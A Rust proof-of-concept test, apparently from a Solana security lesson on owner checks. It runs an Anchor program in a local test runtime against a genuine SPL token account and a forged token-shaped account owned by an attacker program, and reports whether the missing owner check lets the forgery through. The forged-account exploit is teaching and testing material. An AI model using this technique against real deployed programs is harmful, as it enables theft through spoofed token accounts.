//! Two-sided PoC driving the modernized Anchor program through the REAL solana-runtime
//! SVM (solana-program-test). Lesson 2, owner-checks.
//!
//! The handler `log_message` takes accounts `[token, authority]`, unpacks the SPL token
//! account from `token`, and checks `authority.key == token.owner`. The vulnerability: it
//! never verifies the account is actually OWNED by the SPL Token program, so a fake account
//! owned by an attacker program, carrying forged token-shaped bytes whose `owner` field is
//! the attacker's own authority, passes the check. The fix asserts
//! `token.to_account_info().owner == &spl_token::ID` first.
//!
//! CONTROL: a real SPL token account (Solana owner = spl_token::ID) whose SPL `owner` field
//! equals the signed authority -> must be accepted by both variants.
//!
//! EXPLOIT: a FAKE account whose Solana owner is a NON-spl_token program id, carrying
//! forged SPL-token-shaped bytes whose `owner` field equals the signed authority. The
//! INSECURE handler accepts it (the owner-check invariant is violated) -> `INVARIANT
//! VIOLATED:` + exit(101). The SECURE handler rejects it -> `invariant held`.
use anchor_lang::InstructionData;
use solana_harness_anchor::instruction as spike_ix;
use solana_program::program_option::COption;
use solana_program::program_pack::Pack;
use solana_program::{account_info::AccountInfo, entrypoint::ProgramResult, pubkey::Pubkey};
use solana_program_test::{processor, ProgramTest};
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    signature::{Keypair, Signer},
    system_program,
    transaction::Transaction,
};

// Adapt anchor's generated `entry` to solana-program-test's `ProcessInstruction` type.
// The alias keeps the accounts-slice and `AccountInfo` lifetimes independent, while
// anchor's `entry` ties them to one `'info`. The test runner always hands us a slice
// whose `AccountInfo`s outlive the call, so bridging the two lifetimes for the duration
// of `entry` is sound.
fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    data: &[u8],
) -> ProgramResult {
    // SAFETY: lifetime bridge only — same `&[AccountInfo]` type, relaxing the
    // independent (slice, element) lifetimes into the single `'info` anchor's `entry`
    // requires. The referent outlives the synchronous `entry` call (runner contract).
    let tied: &[AccountInfo] = unsafe { core::mem::transmute(accounts) };
    solana_harness_anchor::entry(program_id, tied, data)
}

/// Build SPL-token-account-shaped bytes whose stored `owner` field is `token_owner`,
/// holding `amount` tokens of `mint`. Used for both the genuine CONTROL account and the
/// forged EXPLOIT payload — the bytes are identical; only the Solana account `owner`
/// differs between the two.
fn spl_token_account_data(mint: Pubkey, token_owner: Pubkey, amount: u64) -> Vec<u8> {
    let mut data = vec![0u8; spl_token::state::Account::LEN];
    spl_token::state::Account {
        mint,
        owner: token_owner,
        amount,
        delegate: COption::None,
        state: spl_token::state::AccountState::Initialized,
        is_native: COption::None,
        delegated_amount: 0,
        close_authority: COption::None,
    }
    .pack_into_slice(&mut data);
    data
}

#[tokio::main]
async fn main() {
    let program_id: Pubkey = solana_harness_anchor::ID;
    let mut pt =
        ProgramTest::new("solana_harness_anchor", program_id, processor!(process_instruction));

    let authority = Keypair::new();
    let mint = Pubkey::new_unique();

    // CONTROL token: a genuine SPL token account (Solana owner == spl_token::ID) whose SPL
    // `owner` field == the authority.
    let token_ctrl = Pubkey::new_unique();
    pt.add_account(
        token_ctrl,
        Account {
            lamports: 1_000_000,
            data: spl_token_account_data(mint, authority.pubkey(), 1000),
            owner: spl_token::ID,
            executable: false,
            rent_epoch: 0,
        },
    );

    // EXPLOIT token: a FAKE account owned by a NON-spl_token program, carrying forged
    // token-shaped bytes whose SPL `owner` field == the authority (so the
    // `authority.key == token.owner` check passes once the bytes are unpacked).
    let fake_program = Pubkey::new_unique();
    let token_exploit = Pubkey::new_unique();
    pt.add_account(
        token_exploit,
        Account {
            lamports: 1_000_000,
            data: spl_token_account_data(mint, authority.pubkey(), 9999),
            owner: fake_program,
            executable: false,
            rent_epoch: 0,
        },
    );

    pt.add_account(
        authority.pubkey(),
        Account {
            lamports: 1_000_000,
            data: vec![],
            owner: system_program::ID,
            executable: false,
            rent_epoch: 0,
        },
    );

    let (banks, payer, recent) = pt.start().await;
    let data = spike_ix::LogMessage {}.data();

    // CONTROL: genuine token account owned by the SPL Token program, SPL owner == authority.
    let ix_ctrl = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new_readonly(token_ctrl, false),
            AccountMeta::new_readonly(authority.pubkey(), true),
        ],
        data: data.clone(),
    };
    let mut tx_ctrl = Transaction::new_with_payer(&[ix_ctrl], Some(&payer.pubkey()));
    tx_ctrl.sign(&[&payer, &authority], recent);
    let ctrl = banks.process_transaction(tx_ctrl).await;
    if ctrl.is_ok() {
        println!("CONTROL OK: genuine SPL-owned token account accepted");
    } else {
        println!("control anomaly: genuine SPL-owned token account rejected ({:?})", ctrl);
    }

    // EXPLOIT: fake account owned by a non-spl_token program, forged token bytes.
    let ix_exp = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new_readonly(token_exploit, false),
            AccountMeta::new_readonly(authority.pubkey(), true),
        ],
        data,
    };
    let mut tx_exp = Transaction::new_with_payer(&[ix_exp], Some(&payer.pubkey()));
    tx_exp.sign(&[&payer, &authority], recent);
    let exp = banks.process_transaction(tx_exp).await;
    if exp.is_ok() {
        eprintln!(
            "INVARIANT VIOLATED: accepted a token account not owned by the SPL Token program (owner-check)"
        );
        std::process::exit(101);
    } else {
        println!("invariant held: account not owned by the SPL Token program rejected ({:?})", exp);
    }
}
